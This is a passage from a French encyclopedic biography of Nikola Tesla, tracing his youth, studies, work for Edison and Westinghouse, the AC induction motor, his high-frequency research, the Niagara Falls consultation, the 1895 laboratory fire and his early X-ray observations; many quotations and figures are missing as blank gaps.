Toutefois, parce qu'il est né dans la partie croate des confins militaires (une zone tampon contrôlée par les Habsbourg le long de la frontière ottomane), certains Croates revendiquent pour Tesla la nationalité croate. Ainsi, depuis sa mort en 1943, de nombreuses controverses ont éclaté quant à sa nationalité, des nationalistes serbes et croates se livrant à de nombreux débats pour s'attribuer son origine. Toutefois en 2006, pour les 150 ans de sa naissance, une cérémonie est organisée dans son village natal. Y assistent à la fois le président croate Stjepan Mesić qui présente Tesla comme et le président de la Serbie Boris Tadić pour qui Tesla fait partie du aux pays de la région. Lors de cette réunion, la majorité des discours insistent sur le passé commun à la Serbie et la Croatie, dont Tesla est un symbole.
Jeunesse.
Enfance.
Nikola Tesla naît dans la nuit du 9 au , à Smiljan, dans les confins militaires de l’empire d’Autriche. Il naît lors d'une nuit d'orage très violente. Sa grand-mère interprète cela en disant que l'enfant serait l', alors que sa mère au contraire déclare qu'il serait l'. Son père, Milutin Tesla, est le prêtre orthodoxe serbe de Smiljan. Sa mère, Duka Mandić, est la fille d’un prêtre orthodoxe serbe originaire de Lika et Banija et antérieurement du Kosovo. Elle a un don pour la fabrication d’outils artisanaux et, bien qu’analphabète, est capable de mémoriser des textes de poésie épique serbe et des passages de la Bible. Nikola est le quatrième de cinq enfants. Il a trois sœurs, Milka, Angelina et Marica, et un frère aîné, Dane, qui décède après un accident de cheval alors que Nikola a sept ans.
La mort de Dane a un impact négatif sur la relation qu'a Nikola avec ses parents, plus particulièrement avec son père. En effet, Dane est vu comme et est le fils préféré de Milutin. Sa mort est ainsi très difficile à accepter, et Nikola se sent rejeté par ses parents : . Dane étant censé suivre son père en devenant à son tour prêtre, c'est sur Nikola que Milutin repose ses espoirs. Il donne alors à Nikola des exercices, tels que du calcul mental, répéter de longues phrases ou essayer de deviner ses pensées, tous dans un but d'améliorer son esprit critique. Sa relation compliquée avec son père provoque des obsessions étranges chez Nikola : il ne supporte pas la vue de boucles d’oreilles et de perles sur les femmes, il refuse de toucher les cheveux d'autres personnes, est dérangé par l'odeur du camphre, est obligé de compter ses pas et se force à faire un nombre d'actes divisible par trois sans quoi il recommence toute action.
Dès son enfance, Tesla montre de grandes aptitudes intellectuelles, bénéficiant d’une mémoire eidétique hors du commun et d’un génie inventif qu'il attribue plus tard aux gènes et à l'influence de sa mère. Tesla est cependant troublé par des visions et a de la peine à contrôler ses émotions. Il se passionne pour le tir à l'arc et utilise son imagination pour . Il essaie alors d'imaginer un appareil qui lui permettrait de voler et conçoit un objet volant utilisant les propriétés du vide et de la pression pour faire tourner un cylindre. Ses premières expérimentations s'avèrent concluantes, mais la vitesse de rotation du cylindre n'est finalement pas suffisante pour faire décoller l'engin. Un autre projet de machine volante, censée , consiste à mouvoir quatre hélices en y attachant des hannetons. Ce projet est cependant abandonné après qu'un autre enfant a attrapé et mangé un des insectes. Dégoûté par l'événement, Tesla promet de ne plus jamais toucher d'insectes de sa vie.
Peu après la mort de son frère, Tesla commence à lire dans la bibliothèque de son père, ce que ce dernier n'approuve pas. Milutin cache les bougies pour empêcher Nikola de se , mais Tesla finit par créer ses propres bougies et continue à lire. À 12 ans, il découvre le livre "Abafi" de Miklós Jósika, qui raconte l'histoire d'un . Ce livre est une révélation pour Tesla et il lui permet d'enfin prendre contrôle de ses émotions : .
Éducation.
En 1861, Tesla fréquente l'école primaire de Smiljan où il étudie l'allemand, l'arithmétique et la religion. En 1862, la famille Tesla s'installe dans la localité voisine de Gospić, où le père de Tesla travaille comme curé de paroisse. Tesla y termine l'école primaire, puis le collège. En 1870, Tesla s'installe à Karlovac pour suivre les cours du , où les cours sont dispensés en allemand, comme c'était l'usage dans les écoles situées à l'intérieur de la frontière militaire austro-hongroise. Tesla est capable de faire du calcul intégral de tête, ce qui fait croire à ses professeurs qu'il triche. Il termine un cursus de quatre ans en trois ans et obtient son diplôme en 1873.
Premier contact avec l'électricité.
Tesla commence à s'intéresser à l'électricité très jeune. Alors qu'il joue avec le chat familial Macak, il découvre l'électricité statique, . Il déclare plus tard : . Curieux, il interroge son père, qui lui répond qu'il s'agit d’électricité, . Ces premiers questionnements deviennent une véritable obsession pour Tesla : .
Au lycée de Karlovac, Tesla est impressionné par les démonstrations de son professeur de physique. Elles le motivent plus que jamais à étudier l'électricité, cette . Tesla lit alors tout ce qu'il trouve sur le phénomène, se prend de passion pour le radiomètre de Crookes et expérimente avec des batteries, des bobines et des générateurs électriques.
Maladies.
Alors qu'il étudie à Karlovac, Tesla vit avec la sœur de son père dans une zone très marécageuse. Les moustiques y sont ainsi nombreux, et il contracte le paludisme, qu'il traite en prenant énormément de quinine. La maladie ne le quitte cependant pas avant plusieurs années.
Une fois son diplôme du lycée Karlovac obtenu, Tesla retourne à Smiljan. Peu après son arrivée, il contracte le choléra, reste alité pendant neuf mois et frôle la mort à plusieurs reprises. Le père de Nikola, dans un moment de désespoir, et bien qu'il veuille que son fils entre dans la prêtrise, promet de l'envoyer dans la meilleure école d'ingénieurs s'il se remet de la maladie. Alors qu'il est malade, il lit les œuvres de Mark Twain, ce qu'il considère comme l'ayant aidé à se remettre miraculeusement de sa maladie.
Études secondaires.
En 1874, Tesla échappe au service militaire obligatoire dans l'armée austro-hongroise à Smiljan en s'enfuyant au sud-est de Lika à Tomingaj, près de Gračac. Là, il explore les montagnes en tenue de chasseur, lit de nombreux livres et conçoit des inventions qu'il juge lui-même . Selon Tesla, ce contact avec la nature l'a rendu plus fort, tant physiquement que mentalement.
En 1875, Tesla s'inscrit à l'université technique de Graz grâce à une bourse de la Frontière militaire. Il s’enrôle dans les départements de physique et mathématiques dans l'idée de devenir plus tard professeur, probablement pour satisfaire son père qui aurait eu du mal à imaginer Nikola en tant qu'ingénieur. Durant sa première année, Tesla ne manque jamais un cours, obtient les meilleures notes possibles, réussit neuf examens (presque deux fois plus que le nombre requis) et fonde un club culturel serbe. Le doyen de la faculté technique adresse alors une lettre à son père dans laquelle il déclare : . Quand Tesla rentre à Smiljan à la fin de l'année scolaire, il s'attend à impressionner ses parents avec ses résultats, mais les retrouve peu enthousiastes et inquiets pour sa santé. En effet, durant l'année scolaire, Tesla a un rythme de vie effréné ; il se réveille à 3 heures du matin et lit généralement jusqu'à 23 heures, ne se laissant aucune pause pour des loisirs, même les dimanches et les jours de fête. Un de ses professeurs, craignant pour la santé de Tesla, envoie ainsi plusieurs lettres tout au long de l'année scolaire au père de Nikola le priant de retirer son fils de l'école.
En 1876 ou 1877, Tesla entre en désaccord avec son professeur de physique Jakob Pöschl lors de la démonstration d'une machine de Gramme. Pöschl raccorde la machine à une batterie pour l'utiliser comme moteur en courant continu, mais les balais, mal ajustés, créent des étincelles. Tesla observe alors la machine et conclut qu'elle pourrait fonctionner de la même manière sans balais. Pöschl, qui pense que ce sont les balais qui convertissent l'énergie électrique en énergie mécanique, contredit Tesla en précisant que, selon lui, cela serait équivalent à tenter de créer un mouvement perpétuel. Convaincu qu'il a raison, Tesla abandonne ses plans de devenir professeur et intègre la faculté d'ingénierie.
Bien que sa position d'étudiant en ingénierie lui aurait permis de construire un modèle fonctionnel de moteur sans balais, Tesla choisit de simplement explorer l'idée dans son imagination, en deux étapes : . Tesla pense donc que la solution se trouve en courant alternatif, une innovation puisque, à cette époque, on utilise du courant continu pour presque toutes les applications de l'électricité. Tesla a également l'idée de coupler un moteur à un générateur, et non pas une batterie, ce qui est également une innovation probablement inspirée par la présentation d'Hippolyte Fontaine à Vienne, que Pöschl a expliqué à Tesla, durant laquelle Fontaine raccorde un moteur à une dynamo. Malgré un concept de base bien établi, Tesla n'arrive pas à réaliser son idée physiquement.
Après une altercation avec un camarade de classe allemand, durant laquelle celui-ci se moque de Tesla pour son assiduité au travail scolaire, Tesla commence à sortir avec d'autres étudiants jusqu'à tard le soir. Il y apprend les dominos, les échecs, devient un très bon joueur de billard et développe une addiction aux jeux de cartes et d'argent. Lors du premier semestre de sa troisième année d'études, Tesla ne va plus en cours et il n'est enregistré dans aucune classe au printemps 1878. Tesla perd ainsi sa bourse militaire et tente en vain d'en obtenir une nouvelle auprès d'un journal pro-serbe de Novi Sad.
Selon certaines sources, Tesla aurait obtenu son diplôme de premier cycle de l’université de Graz. Toutefois, selon l’université, il n’aurait pas poursuivi ses études au-delà du premier semestre de sa troisième année et n'aurait ainsi obtenu aucun diplôme.
Premiers emplois.
En , Tesla quitte Graz, n'a plus de contact avec sa famille et déménage à Maribor où on l’emploie comme assistant ingénieur. Il passe alors ses soirées dans une taverne, « Le paysan heureux », à jouer aux cartes. En , son ancien colocataire Kosta Kulišić séjourne à Maribor et rencontre par hasard Tesla à la taverne. Kulišić contacte alors la famille de Tesla, leur indiquant qu'il se trouvait à Maribor. Deux mois plus tard, Milutin Tesla se rend à Maribor pour convaincre Nikola de reprendre ses études à l’université Charles de Prague. Tesla refuse alors de rentrer chez ses parents et tient tête à son père, qui tombe malade. Tesla est cependant renvoyé à Gospić quelques semaines plus tard après avoir été arrêté pour vagabondage. Milutin, frappé de voir son fils ramené par la police, meurt le .
Après la mort de son père, Tesla reste à Gospić, continue de participer à des jeux d'argent et enseigne dans son ancienne école. Avec l'aide de sa mère, il parvient à se contrôler et accepte finalement de reprendre ses études à Prague, ses oncles maternels lui fournissant les fonds nécessaires. Là, il est influencé par Ernst Mach et suit un cours de Carl Stumpf intitulé dans lequel Tesla apprend le concept de tabula rasa. Tesla continue de travailler sur son idée de moteur à courant alternatif à Prague, bien qu'il soit uniquement inscrit à des cours de mathématiques, physique expérimentale et philosophie : . Il y fait des expérimentations, telles que , sans vraiment parvenir à des résultats concluants. Malgré cela, ces essais s'avèrent importants pour Tesla car ils lui permettent de mieux comprendre le fonctionnement d'un moteur et il sent qu'il .
En , alors que ses oncles ont arrêté de lui envoyer de l'argent, Tesla quitte Prague pour Budapest. Tesla choisit Budapest, car il a récemment appris que Tivadar Puskás, un collaborateur de Thomas Edison, est sur le point d'y construire des centraux téléphoniques. Les travaux doivent être supervisés par Ferenc Puskás, le frère de Tivadar, qui a servi dans l'armée dans la même unité que l'oncle de Tesla, Pavle Mandić. Tesla demande ainsi à son oncle de le recommander pour aider à construire le réseau téléphonique de Budapest mais, n'arrivant pas à financer leur projet immédiatement, les frères Puskás trouvent un travail à Tesla comme dessinateur pour l'Office central du télégraphe du gouvernement hongrois. Très vite repéré par l'inspecteur en chef, il est finalement transféré à un poste où il fait des calculs et des estimations et aide à la conception d'une nouvelle installation téléphonique. Tesla réalise alors sa première réelle invention, un ancêtre du haut-parleur qu'il n'a jamais breveté ni exposé publiquement.
Bien qu'il soit d'abord heureux d'être en contact direct avec des appareils électriques, Tesla se lasse vite d'un travail qu'il juge trop limité. Tesla finit donc par démissionner et se tourne vers ses inventions. Durant l'année 1881, Tesla est affecté par une étrange maladie que les médecins n'arrivent pas à diagnostiquer. Il souffre notamment d'une sensibilité aiguë de tous les sens et reste cloué au lit plusieurs mois, les médecins lui donnant peu de chance de s'en sortir. Il est possible que cette maladie soit une dépression nerveuse due au peu d'intérêt que les gens portent à ses nouvelles inventions. Tesla doit sa rémission à Antal Szigeti, un homme qu'il rencontre à Budapest et avec qui il se lie d'amitié : .
Pour aider Tesla à se remettre de sa maladie, Szigeti l'invite à venir marcher avec lui au Városliget. Tesla accepte et passe la plupart de ses soirées avec Szigeti à discuter de ses idées de moteur à courant alternatif. Un jour, alors que Tesla récite un poème de Johann Wolfgang von Goethe, il a un pendant lequel une idée lui vient . Il commence alors à dessiner les plans d'une nouvelle invention dans le sable tout en l'expliquant à Szigeti. Les images seraient apparues tellement clairement à Tesla qu'il en serait venu à demander à son ami s'il . C'est les images et du poème de Goethe qui inspirent Tesla à utiliser un champ magnétique tournant pour la conception de son moteur.
L'épisode du parc à Budapest n'a pas seulement aidé Tesla à avancer dans ses recherches sur le premier moteur à courant alternatif, il lui a également confirmé qu'il était capable de devenir inventeur. Tesla prend alors pleine conscience de son pouvoir créatif et il se voit devenir . En 1882, il profite de son travail aux Compagnies Ganz pour en apprendre plus sur le courant alternatif . C'est en travaillant chez Ganz que Tesla, en faisant des expériences avec un transformateur électrique défectueux en forme d'anneau, confirme sa théorie selon laquelle il est possible d'utiliser un courant alternatif pour créer un champ magnétique tournant.
En 1882, Tesla est enfin engagé par Ferenc Puskás pour aider à développer le réseau téléphonique de Budapest. C'est alors que Tesla invente de nouveaux répéteurs et amplificateurs pour téléphone. Une fois le travail terminé, Tivadar Puskás, qui est à Paris pour aider Thomas Edison à introduire sa nouvelle technologie d'éclairage public à incandescence en France, invite Tesla et Szigeti à le rejoindre pour travailler pour la Edison General Electric Company.
Ingénieur chez Edison.
En France.
À Paris, Tesla se distingue auprès du directeur de la Continental Edison, , probablement grâce à ses études supérieures en physique et mathématiques qui le rendent aussi bon en théorie qu'en pratique. Il tente alors à plusieurs occasions d'expliquer ses idées de moteur à courant alternatif à ses collègues, en vain. Ceux-ci ne sont pas intéressés par ses idées, car la est occupée à commercialiser des solutions d'éclairages électriques et ne voit pour l'instant pas l'intérêt de développer des systèmes motorisés. Une autre raison du désintérêt des employés d'Edison vient peut-être aussi du fait que les idées de Tesla semblent être trop gourmandes en cuivre. En effet, une des politiques imposées par Thomas Edison consiste à utiliser le moins de cuivre possible dans ses systèmes, et Tesla prévoit d'alimenter son moteur avec six fils de cuivre, de façon à créer trois courants alternatifs déphasés.
Tesla est ensuite employé par l'entreprise d'Edison en France et en Allemagne dans plusieurs stations d'éclairage. Il impressionne le directeur d'une des filières d'Edison, Louis Rau et est envoyé à Strasbourg, qui fait alors partie de l'Empire allemand. Là-bas, il est chargé de réparer les dommages causés par un court-circuit à la gare de Strasbourg-Ville, en construction dans le cadre de la Neustadt. La gare de Strasbourg comporte alors un système d'éclairage de alimentées par quatre générateurs en plus d'une installation de Siemens &amp; Halske de cinq générateurs à courant continu pour . Durant les travaux, Tesla trouve un générateur à courant alternatif de Siemens et commence à construire un prototype de moteur à courant alternatif dans son temps libre. Après plusieurs essais, il réussit à faire tourner son moteur pour la première fois : .
À Strasbourg et à Paris, Tesla tente à plusieurs reprises de trouver des investisseurs, mais personne ne semble vraiment s'intéresser à ses projets. Au printemps 1884, Charles Batchelor est rappelé aux États-Unis par Edison pour gérer à New York. Batchelor demande alors à Tesla de le suivre pour travailler sur son moteur.
Aux États-Unis.
Tesla émigre en et commence à travailler presque immédiatement chez Machine Works dans le Lower East Side de Manhattan, aux côtés d'une vingtaine d' qui peinent à mettre en place l'usine électrique de la ville. Comme à Paris, Tesla travaille au dépannage des installations et à l'amélioration de générateurs. L'atelier où il travaille est surpeuplé : plusieurs centaines de machinistes, d'ouvriers et de cadres y sont employés. L'historien W. Bernard Carlson note que Tesla n'a peut-être rencontré Thomas Edison qu'à quelques reprises. Une de ces rencontres est décrite dans l'autobiographie de Tesla : après avoir passé la nuit à réparer les dynamos endommagées du paquebot SS Oregon, il rencontre Batchelor et Edison, qui l'appellent . Après que Tesla leur a dit qu'il était resté debout toute la nuit pour réparer l'Oregon, Edison fait remarquer à Batchelor que . L'un des projets confiés à Tesla consiste à mettre au point un système d'éclairage public basé sur des lampes à arc. L'éclairage à arc est le type d'éclairage public le plus populaire, mais il nécessite des tensions élevées et est incompatible avec le système à incandescence basse tension d'Edison, et la société perd des contrats dans des villes qui veulent un éclairage public. Les dessins de Tesla ne sont jamais mis en production, peut-être en raison d'améliorations techniques apportées à l'éclairage public à incandescence ou d'un contrat d'installation qu'Edison a conclu avec une société d'éclairage à arc.
Après six mois de travail chez Machine Works, en 1885, Tesla démissionne. L'événement qui a précipité son départ n'est pas certain. Il s'agit peut-être d'une prime qu'il n'a pas reçue, soit pour avoir conçu de nouveaux générateurs, soit pour le système d'éclairage à arc qui avait été mis de côté. Tesla a déjà eu des démêlés avec la société Edison à propos de primes non versées qu'il pensait mériter. Dans son autobiographie, Tesla déclare que le directeur d'Edison Machine Works lui a promis une prime de pour concevoir , . Dans des versions ultérieures de cette histoire, Thomas Edison aurait offert lui-même une prime puis serait revenu sur sa parole, en disant . Tesla aurait alors donné sa démission, et Edison aurait tenté de le faire rester en lui offrant une augmentation. Le journal de Tesla ne contient qu'un seul commentaire sur sa démission, une note qu'il a griffonnée sur les deux pages couvrant la période du au , en disant ().
Débuts en tant qu'inventeur indépendant.
Tesla Electric Light &amp; Manufacturing.
Peu après avoir quitté la société Edison, Tesla s'attelle à la tâche de breveter un système d'éclairage à arc, peut-être le même qu'il a développé chez Edison. En , il rencontre l'avocat Lemuel W. Serrell, qui travaille entre autres pour Edison, afin d'obtenir de l'aide pour soumettre les brevets. Serrell présente Tesla à deux hommes d'affaires, Robert Lane et Benjamin Vail, qui acceptent de financer une société de fabrication et d'utilité d'éclairage à l'arc à son nom, la . Tesla travaille pendant le reste de l'année sur un générateur à courant continu amélioré et la construction et l'installation du système à Rahway, dans le New Jersey, et obtient ses premiers brevets aux États-Unis. Le nouveau système de Tesla est remarqué par "Electrical Review", un journal technique de New York, qui publie un article sur l'installation de Rahway en première page.
Les investisseurs montrent cependant peu d'intérêt pour les idées de Tesla concernant de nouveaux types de moteurs à courant alternatif et d'équipements de transmission électrique. Après la mise en service de l'entreprise en 1886, ils décident que la manufacture de lampes à arc est un marché trop compétitif. Ils optent dès lors pour la simple exploitation d'une entreprise d'électricité, qu'ils créent, abandonnant la société de Tesla. Tesla perd même le contrôle de ses brevets, puisqu'il les a précédemment cédés à Tesla Electric &amp; Manufacturing en échange d'actions. Sans le sou, l'inventeur ne trouve plus de travail comme ingénieur et multiplie les petits boulots, tels que réparateur de circuits électriques ou comme ouvrier dans une société qui creuse des fossés pour par jour ( en ). Tesla lui-même considère cette période comme très difficile, écrivant : .
Nikola Tesla Company et Westinghouse.
Fin de 1886, Tesla rencontre Alfred S. Brown, un surintendant de la Western Union, et Charles Fletcher Peck, un avocat de New York. Les deux hommes ont de l'expérience dans la création d'entreprises et la promotion des inventions et savent comment en tirer un profit. Sur la base des nouvelles idées de Tesla, notamment une idée de moteur thermomagnétique, ils acceptent de soutenir financièrement l'inventeur et de s'occuper de ses brevets. Ensemble, ils forment la Tesla Electric Company en et s'accordent pour que Tesla reçoive un tiers des bénéfices, tandis que Brown et Peck se partagent un tiers ; le dernier tiers est réinvesti dans de futures inventions. Ils louent un laboratoire pour Tesla à Manhattan, où il travaille à l'amélioration et au développement de nouveaux types de moteurs électriques, de générateurs et d'autres dispositifs, avec Sziget comme assistant.
En 1887, Tesla met au point un moteur à induction qui fonctionne sur courant alternatif. En plus de faire breveter le moteur, Peck et Brown organisent des tests indépendants pour vérifier qu'il est fonctionnel et en font la promotion au moyen de communiqués de presse envoyés à des publications techniques pour des articles à paraître en même temps que la délivrance du brevet. Le physicien William Arnold Anthony, qui a testé le moteur, et le rédacteur en chef du magazine "Electrical World", Thomas Commerford Martin, organisent une démonstration du moteur de Tesla le à l’"American Institute of Electrical Engineers". Les ingénieurs de la Westinghouse Electric signalent alors à George Westinghouse que Tesla a un moteur à courant alternatif viable, ce dont Westinghouse a besoin pour un système à courant alternatif qu'il a déjà commencé à commercialiser. Bien que Westinghouse ait cherché à obtenir un brevet sur un moteur similaire développé en 1885 par le physicien italien Galileo Ferraris, il se rabat sur le modèle de Tesla, estimant que celui-ci va probablement dominer le marché.
En , Brown et Peck négocient un accord de licence avec George Westinghouse pour la conception des moteurs et transformateurs de Tesla pour en espèces et en actions et une redevance de par cheval-vapeur produit par chaque moteur (respectivement et en ). Westinghouse engage également Tesla pendant un an pour la somme de par mois ( en ) pour être consultant dans les laboratoires de Pittsburgh de la Westinghouse Electric.
Au cours de cette année, Tesla travaille à Pittsburgh, aidant à créer un système de courant alternatif pour alimenter les tramways de la ville. Il trouve cette période frustrante en raison de conflits avec les autres ingénieurs de Westinghouse sur la meilleure façon de mettre en place le courant alternatif. Entre eux, ils se mettent d'accord sur un système à courant alternatif de 60 cycles que Tesla a proposé (pour correspondre à la fréquence de fonctionnement du moteur de Tesla), mais ils s’aperçoivent vite que cela ne fonctionnera pas pour les tramways, puisque le moteur à induction de Tesla ne peut fonctionner qu'à une vitesse constante. Ils finissent par utiliser un moteur de traction à courant continu à la place.
Un marché très compétitif.
La démonstration par Tesla de son moteur à induction et l'obtention ultérieure par Westinghouse d'une licence sur le brevet, tous deux en 1888, ont lieu alors que les compagnies d'électricité se livrent une intense concurrence. Les trois grandes entreprises, Westinghouse, Edison et Thomson-Houston, essayent de se développer dans un secteur à fort capital et se sous-estiment mutuellement. Edison Electric va jusqu'à faire de la propagande et essaye de faire valoir que son système à courant continu est meilleur et plus sûr que le système à courant alternatif de Westinghouse. La concurrence signifie que Westinghouse n'a finalement pas les moyens financiers et techniques pour développer immédiatement le moteur de Tesla.
Deux ans après la signature du contrat avec Tesla, Westinghouse Electric se retrouve en difficulté. Le quasi-effondrement de la Barings Bank, à Londres, déclenche la panique de 1890, poussant les investisseurs à demander le remboursement de leurs prêts à Westinghouse Electric en retour. Le manque soudain de liquidités oblige l'entreprise à renflouer ses dettes. De nouveaux prêteurs exigent alors que Westinghouse réduise ce qui semble être des dépenses excessives dans l'acquisition d'autres sociétés, la recherche et les brevets, y compris la redevance par moteur prévue dans le contrat Tesla. À ce moment-là, le moteur à induction Tesla peine à être mis en place et est bloqué en phase de développement. Westinghouse paye alors une redevance garantie de par an bien que les modèles fonctionnels du moteur de Tesla soient rares et que les systèmes d'alimentation polyphasés nécessaires pour le faire fonctionner soient encore plus rares.
Au début de l'année 1891, George Westinghouse explique de manière très claire ses difficultés financières à Tesla, en disant que s'il ne répond pas aux exigences de ses prêteurs, il ne contrôlera plus Westinghouse Electric et Tesla devra traiter avec les banquiers lui-même pour tenter de percevoir ses futures redevances. Le fait de voir Westinghouse continuer à défendre le moteur convainc Tesla, et il accepte de libérer la société des redevances prévues dans son contrat. Six ans plus tard, Westinghouse achète le brevet de Tesla pour une somme de ( en ) dans le cadre d'un accord de partage de brevet signé avec General Electric (une société issue de la fusion, en 1892, entre Edison et Thomson-Houston).
Laboratoires de New York.
L'argent que Tesla gagne grâce à ses brevets le rend financièrement indépendant et lui donne le temps et les fonds nécessaires pour poursuivre ses propres intérêts. En 1889, Tesla quitte le magasin de Liberty Street que Peck et Brown louent pour lui. Il travaille alors pendant les douze années suivantes dans plusieurs ateliers et laboratoires à Manhattan : un laboratoire au 175 Grand Street (1889-1892), le quatrième étage du 33-35 South Fifth Avenue (1892-1895), et les sixième et septième étages des 46 &amp; 48 East Houston Street (1895-1902).
Alors que Tesla quitte Westinghouse, Szigeti, son ami et associé depuis plus de neuf ans, lui annonce qu'il aimerait partir pour développer ses propres idées. Son départ est particulièrement difficile à accepter pour Tesla et le blesse profondément.
Travail en haute fréquence.
Au cours de l'été 1889, Tesla se rend à l'Exposition universelle de Paris et prend connaissance des expériences de Heinrich Hertz qui prouvent l'existence de rayonnements électromagnétiques. Tesla trouve cette nouvelle découverte et décide de l'explorer plus en profondeur. En répétant, puis en développant ces expériences, Tesla invente la bobine Tesla, utilisée pour produire de l'électricité à haute tension, à faible courant et à haute fréquence en courant alternatif.
Les travaux de Tesla se concentrent alors sur la haute fréquence, et plus particulièrement sur la conversion d'électricité en lumière, alors que Guglielmo Marconi, un autre inventeur, a développé les théories de Hertz pour des utilisations en télécommunications. Afin de promouvoir ses découvertes, Tesla utilise ce qu'il a appris avec Peck et Brown : il publie plusieurs articles dans des journaux spécialisés, pose des brevets sur ses inventions et donne une série de conférences dans des universités et écoles d'ingénieurs. Lors de démonstrations publiques pour un système d'éclairage, il allume des tubes de Geissler et des ampoules à incandescence sans utiliser de fils. En 1893, Tesla déclare aux spectateurs de plusieurs conférences qu'il est sûr qu'un système comme le sien pourrait éventuellement conduire en le conduisant à travers la terre. Tesla entre également en conflit avec Elihu Thomson, qui travaille sur la haute fréquence et n'observe pas toujours les mêmes résultats que lui ; Tesla et Thomson se répondent par une série d'articles dans des journaux spécialisés entre et .
Le , à l'âge de 35 ans, Tesla est naturalisé citoyen des États-Unis. En 1892, et jusqu'en 1894, Tesla devient vice-président de l’"American Institute of Electrical Engineers", le précurseur de l’"Institute of Electrical and Electronics Engineers".
Système polyphasé et exposition universelle de 1893.
Début 1893, les ingénieurs de Westinghouse Charles F. Scott puis Benjamin G. Lamme font des progrès sur une version fonctionnelle du moteur à induction de Tesla. Lamme trouve un moyen de rendre l'alimentation polyphasée compatible avec les anciens systèmes monophasés à courant alternatif et à courant continu en développant une commutatrice. Westinghouse Electric a dès lors un moyen de fournir de l'électricité à tous les clients potentiels et commence à donner à son système polyphasé à courant alternatif le nom « ». Ils pensent alors que les brevets de Tesla leur donnent la priorité sur les autres systèmes polyphasés à courant alternatif et envoient des brochures à leurs clients les avertissant que, s'ils venaient à acheter un système alternatif ailleurs, ils pouvaient être poursuivis en justice.
Westinghouse Electric demande à Tesla de participer à l'exposition universelle de 1893 à Chicago, où la société dispose d'un grand espace consacré aux expositions sur l'électricité. Bien que l'entreprise soit passée très proche de la faillite, Westinghouse Electric remporte également l'appel d'offres pour éclairer l'exposition avec du courant alternatif ; Westinghouse obtient le contrat en proposant des prix bien plus bas que ses compétiteurs, ce qui force ses ingénieurs à utiliser des alternateurs plus gros et une tension électrique plus élevée. C'est néanmoins un moment clé dans l'histoire du courant alternatif, car la société démontre au public américain la sécurité, la fiabilité et l'efficacité d'un système alternatif polyphasé qui peut alimenter les autres stands de la foire en courant alternatif et en courant continu.
Un espace d'exposition spécial est mis en place pour présenter différents modèles de moteur à induction de Tesla. Le champ magnétique rotatif qui les actionne est expliqué par une série de démonstrations, dont un œuf de Colomb qui utilise la bobine biphasée d'un moteur à induction pour faire tourner un œuf en cuivre et le faire tenir debout. Tesla visite notamment la foire pour assister au Congrès international sur l'électricité et faire une série de démonstrations au stand Westinghouse. Une pièce spécialement obscurcie est aménagée où Tesla montre son système d'éclairage sans fil, en utilisant une démonstration qu'il avait déjà faite à travers l'Amérique et l'Europe ; il s'agit notamment d'utiliser un courant alternatif à haute tension et haute fréquence pour allumer des lampes à décharge sans fil.
Lors de sa présentation au Congrès international sur l'électricité, dans le hall agricole de l'exposition universelle, Tesla présente un générateur électrique alternatif à vapeur qu'il a breveté cette année-là, ce qu'il pense être une meilleure façon de générer du courant alternatif. La vapeur est forcée dans un oscillateur et s'échappe par une série d'orifices, poussant un piston fixé à une armature de haut en bas. L'armature magnétique vibre alors de haut en bas à grande vitesse, produisant un champ magnétique alternant. Celui-ci induit un courant électrique alternatif dans les bobines de fil situées à proximité. Cela permet de supprimer les pièces compliquées d'un moteur/générateur à vapeur, mais n'est finalement jamais considéré comme une solution technique viable pour produire de l'électricité.
Consultant aux chutes du Niagara.
En 1893, Edward Dean Adams, qui dirige la Niagara Falls Hydraulic Power and Manufacturing Company, demande l'avis de Tesla pour un système de transmission de l'électricité produite aux chutes du Niagara. Pendant plusieurs années, Adams a reçu une série de propositions et a ouvert plusieurs concours afin de déterminer la meilleure façon d'utiliser l'énergie produite sur le site. Parmi les systèmes proposés par plusieurs entreprises américaines et européennes figurent alors des systèmes de courant alternatif biphasé et triphasé, de courant continu à haute tension et d'air comprimé. Adams demande à Tesla des informations sur tous les systèmes en compétition. L'inventeur recommande alors à Adams un système biphasé, jugé plus fiable par Tesla, et lui explique que Westinghouse propose un système compatible avec l'éclairage à incandescence en utilisant un courant alternatif biphasé. L'entreprise d'Adams attribue alors un contrat à Westinghouse Electric pour la construction d'un système de production de courant alternatif biphasé aux chutes du Niagara, sur la base des conseils de Tesla et de la démonstration de Westinghouse à l'exposition universelle, qui prouve qu'ils sont capables de construire un système complet de courant alternatif. Un autre contrat est cependant passé avec General Electric pour la construction du système de distribution.
Nikola Tesla Company.
En 1895, Edward Dean Adams, impressionné par ce qu'il a vu lors de sa visite du laboratoire de Tesla, accepte de participer à la fondation de la Nikola Tesla Company, créée pour financer, développer et commercialiser une variété de brevets antérieurs et nouveaux. Alfred Brown s'engage avec Tesla, apportant avec lui les brevets développés sous Peck et Brown. William Birch Rankine et Charles F. Coaney font également partie du conseil d'administration de la société. Tesla trouve peu d'investisseurs ; le milieu des années 1890 est une période difficile sur le plan financier, et les brevets d'éclairage sans fil et d'oscillateurs qu'il a mis sur le marché n'ont jamais abouti.
Incendie au laboratoire de Tesla.
Le , aux aurores, le bâtiment de la Cinquième Avenue qui abrite le laboratoire de Tesla prend feu. L'incendie commence dans le sous-sol du bâtiment et est si intense que le laboratoire de Tesla, situé au quatrième étage, s'effondre au deuxième étage. L'incendie fait non seulement reculer les projets en cours de Tesla, mais il détruit également une collection de notes et de matériel de recherche, de modèles et de pièces de démonstration, dont beaucoup ont été présentées à l'Exposition universelle de Colombie de 1893. Les pertes s'élèvent à près de ( en ).
La destruction de son laboratoire touche énormément Tesla. Il passe alors plusieurs jours dans son lit et, selon le "New York Herald", il apparaît . Tesla revient quelques jours plus tard sur les lieux de l'incendie avec des ouvriers afin de sauver ce qui peut l'être. Pour surmonter cette épreuve, Tesla s'essaye à l'électrothérapie ; il s'administre plusieurs chocs par jour, probablement au moyen d'une de ses bobines, de façon à .
Rayons X.
Une fois sa dépression atténuée, Tesla déménage au 46 &amp; 48 East Houston Street et reconstruit son laboratoire aux et étages. Une grande partie de son matériel ayant été détruit dans le feu, Tesla commence à travailler sur de nouveaux sujets : les rayons X et la radiocommande.
Tesla étudie déjà les rayons X depuis 1894 ; il parle alors du phénomène comme d'une « énergie radiante invisible », constatée lors de précédentes expériences. Il mène des expériences sur des tubes de Crookes et est peut-être le premier homme à capturer, par accident, une image de rayons X : en , lorsqu'il essaie de photographier Mark Twain éclairé par un tube de Geissler, la seule chose apparente sur l'image est la vis de blocage métallique de l'objectif de l'appareil photo. Quelques mois plus tard, après avoir appris la découverte des rayons X par Wilhelm Röntgen, Tesla réalise qu'il a manqué une découverte scientifique majeure : .
